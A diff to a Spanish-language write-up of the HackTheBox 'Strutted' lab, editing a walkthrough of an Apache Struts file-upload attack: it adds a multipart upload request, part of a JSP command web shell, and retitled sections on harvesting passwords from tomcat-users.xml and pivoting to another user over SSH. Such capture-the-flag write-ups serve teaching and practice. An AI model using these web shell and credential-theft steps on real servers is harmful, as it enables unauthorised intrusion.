@@ -248,7 +248,23 @@ Dentro de Apache Struts, podemos utilizar componentes que se ejecutan antes y de
 
 Estos componentes son conocidos como Interceptores, (`Interceptors` en inglés). Y en el contexto de esta vulnerabilidad, podemos aprovechar estos interceptores para manipularlos y enviar un archivo que derive en ejecución de código 
 
-~~~ http
+~~~ bash
+POST /upload.action HTTP/1.1
+Host: strutted.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------32834433022857169198100887216
+Content-Length: 1192
+Origin: http://strutted.htb
+DNT: 1
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://strutted.htb/upload.action
+Cookie: JSESSIONID=99D75D10643DF4788C0CCE1B8C70CD4B
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
 ...
 ...
 -----------------------------304365947826637974553275897232
@@ -259,6 +275,7 @@ Content-Type: image/jpeg
 ...
 ...
 ...
+-----------------------------304365947826637974553275897232--
 ~~~
 
 ### Proof of Concept 
@@ -290,7 +307,7 @@ Al enviar la solicitud manipulada, intentaremos ver el archivo, si no, retrocede
 ![image-center](/assets/images/posts/strutted-request-2.png)
 {: .align-center}
 
-### WebShell
+### Exploitation
 
 Como tenemos la capacidad de subir archivos, enviaremos una `web shell` para ejecutar comandos a través de un formulario. 
 
@@ -311,7 +328,7 @@ Content-Type: image/jpeg
 
 
 test
-%>
+<%@ page import="java.util.*,java.io.*"%>
 <HTML><BODY>
 <FORM METHOD="GET" NAME="myform" ACTION="">
 <INPUT TYPE="text" NAME="cmd">
@@ -347,7 +364,7 @@ Cuando el archivo sea enviado, podremos acceder a él en el directorio raíz, na
 {: .align-center}
 
 
-## Shell as `www-data`
+## Shell as `tomcat`
 
 Intentaremos enviar una reverse shell de la forma típica, pero no podremos enviar la conexión directamente
 
@@ -419,7 +436,7 @@ tomcat@strutted:~$ export TERM=xterm
 ~~~
 
 
-## Information Leakage - `tomcat-users.xml`
+## Credentials Leakage - `tomcat-users.xml`
 
 Como el servicio web ejecuta `tomcat`, podemos buscar el archivo de configuración que pueda contener credenciales para usuarios válidos. En este caso podemos encontrar el archivo `tomcat-users` en la ruta `etc/tomcat9/tomcat-users.xml` 
 
@@ -437,6 +454,9 @@ tomcat@strutted:~$ cat /etc/tomcat9/tomcat-users.xml | grep password
 ~~~
 
 Vemos una contraseña, si intentamos migrar al usuario `james` en la terminal actual con el comando  `su`, no podremos por alguna configuración definida.
+
+
+## Shell as `james`
 
 Entonces entraremos por `ssh` desde nuestra máquina atacante utilizando estas credenciales
 
